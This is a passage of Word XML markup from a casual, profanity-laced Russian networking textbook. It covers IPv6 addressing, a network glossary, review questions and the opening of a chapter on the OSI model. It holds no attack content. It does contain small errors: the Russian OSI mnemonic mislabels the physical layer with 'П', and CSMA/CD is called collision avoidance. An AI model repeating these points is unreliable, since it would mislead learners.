        <w:t>`2001:0db8:85a3:0000:0000:8a2e:0370:7334`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>→ `2001:db8:85a3:0:0:8a2e:370:7334`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Заменить последовательность нулей на `::`** (только один раз):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`2001:db8:85a3:0:0:8a2e:370:7334`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>→ `2001:db8:85a3::8a2e:370:7334`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры сокращения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`2001:0db8:0000:0000:0000:0000:0000:0001` → `2001:db8::1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`fe80:0000:0000:0000:0000:0000:0000:0001` → `fe80::1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`0000:0000:0000:0000:0000:0000:0000:0001` → `::1` (localhost в IPv6)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Типы IPv6-адресов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Тип | Префикс | Описание | Аналог в IPv4 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----|---------|----------|--------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Unicast</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (глобальный) | `2000::/3` | Публичные адреса (маршрутизируются в интернете) | Публичные IP |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Unicast</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (link-local) | `fe80::/10` | Локальные адреса (только в пределах сети) | `169.254.x.x` (APIPA) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Unicast</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (unique local) | `fc00::/7` | Приватные адреса (не маршрутизируются) | `192.168.x.x`, `10.x.x.x` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Multicast</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | `ff00::/8` | Групповая рассылка | Multicast в IPv4 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Loopback</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | `::1` | Локальный хост | `127.0.0.1` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Unspecified</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | `::` | Неопределённый адрес | `0.0.0.0` |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Link-local адрес</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (`fe80::...`) — это адрес, который </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>автоматически генерируется</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на каждом интерфейсе (из MAC-адреса). Он используется для общения в локальной сети (например, для роутеров).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Почему IPv6 медленно внедряется</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статистика (2025)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Около </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>40%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> интернет-трафика идёт по IPv6 (в США ~50%, в России ~10%).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**NAT работает** — пока IPv4 + NAT справляются, нет мотивации переходить</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обратная несовместимость** — IPv4 и IPv6 не понимают друг друга, нужны **dual-stack** (поддержка обоих) или **туннели** (6to4, Teredo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Старое оборудование** — роутеры, свитчи, firewall-ы 10-летней давности не поддерживают IPv6</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Провайдеры ленятся** — многие провайдеры до сих пор не дают IPv6-адреса клиентам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Страх перед новым** — админы боятся настраивать IPv6 (хотя это не сложнее IPv4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прогноз</w:t>
      </w:r>
      <w:r>
        <w:t>: IPv6 полностью заменит IPv4... когда-нибудь. Может, к 2040 году. А может, и позже.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ethernet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол канального уровня для передачи данных в локальных сетях (LAN), работает с MAC-адресами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MAC-адрес (Media Access Control address)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — уникальный 48-битный идентификатор сетевого адаптера, прошивается на заводе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OUI (Organizationally Unique Identifier)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — первые 3 байта MAC-адреса, идентифицируют производителя оборудования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ethernet-кадр (frame)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — единица передачи данных в Ethernet, содержит MAC-адреса, тип протокола, данные и CRC.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MTU (Maximum Transmission Unit)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — максимальный размер пакета без фрагментации (обычно 1500 байт для Ethernet).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CRC (Cyclic Redundancy Check)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — контрольная сумма для обнаружения ошибок в кадре.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CSMA/CD (Carrier Sense Multiple Access with Collision Detection)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — механизм избегания коллизий в старых Ethernet-сетях с хабами (устарел).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARP (Address Resolution Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол преобразования IP-адреса в MAC-адрес.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARP-таблица (ARP cache)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — кэш соответствий IP ↔ MAC на устройстве.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARP-spoofing (ARP poisoning)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — атака Man-in-the-Middle через подмену MAC-адресов в ARP-таблице.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ICMP (Internet Control Message Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол служебных сообщений для диагностики и уведомлений об ошибках.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ping</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — утилита для проверки доступности хоста через ICMP Echo Request/Reply.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RTT (Round-Trip Time)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — время передачи пакета туда и обратно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Traceroute</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — утилита для отображения маршрута пакета через роутеры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DHCP (Dynamic Host Configuration Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол автоматической настройки сети (выдача IP, маски, шлюза, DNS).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DORA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — 4 шага DHCP: Discover, Offer, Request, Acknowledgment.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lease Time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — время аренды IP-адреса, выданного DHCP-сервером.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NAT (Network Address Translation)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — технология трансляции приватных IP-адресов в публичный IP (экономия IPv4-адресов).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PAT (Port Address Translation)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — расширение NAT с использованием портов для различения устройств (N:1).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Приватные IP-адреса</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — диапазоны IP, не маршрутизируемые в интернете (`10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Port Forwarding</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — проброс портов через NAT для входящих соединений из интернета.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IPv6</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — новая версия IP-протокола с 128-битными адресами (~340 ундециллионов адресов).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Link-local адрес</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — IPv6-адрес `fe80::/10`, генерируется автоматически для локальной сети.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Dual-stack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — поддержка одновременно IPv4 и IPv6 на устройстве.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое MAC-адрес и зачем он нужен?** Чем он отличается от IP-адреса? Приведи пример MAC-адреса.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Как работает ARP?** Опиши процесс преобразования IP-адреса в MAC-адрес (ARP-запрос и ARP-ответ). Что такое ARP-spoofing?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясни процесс получения IP через DHCP (DORA)**. Зачем нужен Lease Time?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое NAT и зачем он нужен?** Как роутер различает пакеты от разных устройств в локальной сети при использовании одного публичного IP?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем IPv6 отличается от IPv4?** Почему IPv6 медленно внедряется, хотя IPv4-адреса уже закончились?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическая задача**: В домашней сети роутер имеет публичный IP `93.184.216.34`. Устройство с приватным IP `192.168.1.100` (порт `54321`) отправляет HTTP-запрос на `142.250.185.46:80` (Google). Роутер в NAT-таблице выделяет порт `12345` для этого соединения. Опиши, как будут выглядеть Source и Destination IP:Port на каждом этапе (клиент → роутер → Google → роутер → клиент).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Для чего используется ICMP?** Как работает `ping`? Как работает `traceroute`?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое Ethernet-кадр?** Какие поля он содержит? Зачем нужен CRC?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Конец главы 8.6</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 🎉</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 8.7. Эталонная модель OSI</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: Зачем семь слоёв, если хватает четырёх?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, братан, мы уже разобрали стек TCP/IP с его четырьмя уровнями (Application, Transport, Network, Link). Но есть ещё одна модель, которую препод обязательно спросит на экзамене — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>модель OSI (Open Systems Interconnection)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. И у неё </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>семь уровней</w:t>
      </w:r>
      <w:r>
        <w:t>, ага. Семь, блять. Хотя в реальной жизни все пользуются TCP/IP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем она нужна, если никто не использует?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Хороший вопрос. Модель OSI — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>теоретическая эталонная модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, созданная в 1984 году организацией ISO (International Organization for Standardization). Она описывает, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как должны</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> работать сети идеально. TCP/IP, напротив, — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>практическая реализация</w:t>
      </w:r>
      <w:r>
        <w:t>, которая развивалась органически и победила на рынке.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему OSI всё ещё учат?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Стандартизация** — OSI даёт универсальный язык для описания сетевых протоколов. Когда инженеры говорят "это протокол уровня 3", все понимают, что речь о маршрутизации.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Модульность** — каждый уровень решает свои задачи, изменения на одном уровне не ломают другие.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Совместимость** — производители оборудования (Cisco, Juniper, Huawei) ориентируются на OSI, чтобы их железо работало вместе.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Устаревшая бюрократия** — просто потому что "так принято", и препод не хочет переписывать лекции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В этой главе мы разберём:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Семь уровней OSI (снизу вверх)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Инкапсуляцию и декапсуляцию</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разницу между OSI и TCP/IP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие устройства работают на каких уровнях</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Реальные примеры, чтобы это не было полным бредом</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.04 (Протоколы Internet)** — TCP/IP — это упрощённая реализация OSI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.02 (Сетевые компоненты)** — свитчи, роутеры, файрволлы работают на разных уровнях OSI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.06 (Сетевые протоколы)** — Ethernet (уровень 2), IP (уровень 3), ARP, ICMP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7.1. Семь уровней OSI: от битов до HTTP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Модель OSI делит сетевую коммуникацию на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>семь уровней</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (layers). Каждый уровень отвечает за свою задачу и взаимодействует только с соседними уровнями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нумерация</w:t>
      </w:r>
      <w:r>
        <w:t>: снизу вверх (1 = физический, 7 = прикладной).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Мнемоническое правило</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (чтобы запомнить порядок):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Снизу вверх (1→7)**: **"П**ожалуйста, **К**упи **С**игарет **Т**ридцать **С**ейчас, **П**ошёл **П**издец"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**П**физический → **К**анальный → **С**етевой → **Т**ранспортный → **С**еансовый → **П**редставления → **П**рикладной</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Или, если хочешь по-английски (более академично):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**"P**lease **D**o **N**ot **T**hrow **S**ausage **P**izza **A**way"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**P**hysical → **D**ata Link → **N**etwork → **T**ransport → **S**ession → **P**resentation → **A**pplication</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Таблица уровней OSI</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| # | Название | Английское | Что делает | PDU (единица данных) | Примеры протоколов/устройств |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|----------|-----------|------------|---------------------|----------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прикладной</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Application | Приложения пользователя | Данные (Data) | HTTP, HTTPS, FTP, SMTP, DNS, SSH, Telnet |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Представления</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Presentation | Кодирование, шифрование, сжатие | Данные (Data) | SSL/TLS, JPEG, MPEG, ASCII, UTF-8 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сеансовый</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Session | Управление сессиями (установка, поддержка, завершение) | Данные (Data) | NetBIOS, RPC, PPTP, SIP |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Транспортный</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Transport | Доставка данных между приложениями (порты) | Сегмент (Segment) / Датаграмма (Datagram) | TCP, UDP |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сетевой</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Network | Маршрутизация между сетями (IP-адреса) | Пакет (Packet) | IP (IPv4, IPv6), ICMP, ARP, OSPF, BGP |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Канальный</w:t>
      </w:r>
      <w:r>
